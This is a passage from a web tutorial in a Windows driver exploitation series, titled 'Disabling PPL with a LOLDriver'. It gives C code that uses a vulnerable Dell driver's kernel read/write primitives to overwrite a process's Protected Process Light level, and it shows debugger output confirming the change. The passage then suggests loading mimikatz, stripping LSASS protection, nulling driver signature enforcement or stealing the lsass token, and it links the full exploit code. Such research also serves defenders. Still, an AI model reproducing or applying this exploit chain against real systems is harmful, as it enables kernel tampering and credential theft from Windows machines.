<pre translate="no" class="language-none"><code v-pre class="language-none">+0x5fa Protection       : _PS_PROTECTION</code></pre>
</doc-codeblock></div>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">typedef union {
	struct 
	{
		char Protection;
		uint8_t padding[7];
	};
	QWORD qword;
} ProtectionQword;

	ProtectionQword protectionqword = { 0 };
	protectionqword.qword =  DellRead(current_eproc + (QWORD)Protection_offset);

	printf(&quot;Proteciton qword: 0x%016llx\n&quot;, protectionqword.qword);
	printf(&quot;Current protection level: 0x%X (%c)\n&quot;, protectionqword.Protection, protectionqword.Protection);

	protectionqword.Protection = 'A';

	DellWrite(current_eproc + (QWORD)Protection_offset, protectionqword.qword);
	printf(&quot;Written data.\n&quot;);

	getchar();</code></pre>
</doc-codeblock></div>
<p>Output:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">[+] EProcess Value for running process: 0xFFFF8B0652872080
Proteciton qword: 0x00000040c0000000
Current protection level: 0x0 ( )
Written data.

--- debugger ---
0: kd&gt; dt nt!_PS_PROTECTION 0xFFFF8B0652872080+0x5fa
   +0x000 Level            : 0x41 'A'
   +0x000 Type             : 0y001
   +0x000 Audit            : 0y0
   +0x000 Signer           : 0y0100</code></pre>
</doc-codeblock></div>
<p>TaDa! From here you can load mimikatz in the process or do do whatever you need to do. You could also just set Lsass.exe to have a protection level of 0.</p>
<p>Full code: <a href="https://github.com/ElJayRight/Driver_Exploits/tree/main/Disable_PPL">https://github.com/ElJayRight/Driver_Exploits/tree/main/Disable_PPL</a></p>
<doc-anchor-target id="closing-thoughts">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#closing-thoughts">#</doc-anchor-trigger>
        <span>Closing Thoughts</span>
    </h2>
</doc-anchor-target>
<p>As always this is just one way of modifying PPL. You could also target the Driver signing enforcement structure and null that out and load your own driver which disables PPL. Another idea would be to just copy the process token of lsass and spawn a mimikatz that way. The offset is <code v-pre>_EPROCESS</code> is:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">+0x248 Token            : _EX_FAST_REF</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="resources-used-while-researching-this-stuff">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#resources-used-while-researching-this-stuff">#</doc-anchor-trigger>
        <span>Resources used while researching this stuff</span>
    </h2>
</doc-anchor-target>
<ul>
<li><a href="https://support.kaspersky.com/common/windows/13905#:%7E:text=Protected%20Process%20Light%20(PPL)%20technology%20is%20used%20for%20controlling%20and,Stream%20deployment">https://support.kaspersky.com/common/windows/13905#:~:text=Protected%20Process%20Light%20(PPL)%20technology%20is%20used%20for%20controlling%20and,Stream%20deployment</a></li>
<li><a href="https://www.crowdstrike.com/en-us/blog/evolution-protected-processes-part-1-pass-hash-mitigations-windows-81/">https://www.crowdstrike.com/en-us/blog/evolution-protected-processes-part-1-pass-hash-mitigations-windows-81/</a></li>
<li><a href="https://web.archive.org/web/20200405151003/https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/">https://web.archive.org/web/20200405151003/https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/</a></li>
<li><a href="https://web.archive.org/web/20200326050008/http://deniable.org/windows/windows-callbacks">https://web.archive.org/web/20200326050008/http://deniable.org/windows/windows-callbacks</a></li>
<li><a href="https://windows-internals.com/kaslr-leaks-restriction/">https://windows-internals.com/kaslr-leaks-restriction/</a></li>
<li><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/">https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/</a></li>
<li><a href="https://github.com/myzxcg/RealBlindingEDR/tree/main">https://github.com/myzxcg/RealBlindingEDR/tree/main</a></li>
</ul>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer id="retype-content-footer" class="clear-both">
                            
                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../windows-driver-exploitation/capcom.sys/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                <span class="block mt-1">Cap​Com.​sys Exploitation</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../windows-driver-exploitation/token_stealing_via_physical_memory/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                <span class="block mt-1">Token Stealing via Physical Memory</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
                                <div id="retype-footer-links" class="print:hidden">
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="retype-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Disabling PPL with a LOLDriver", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
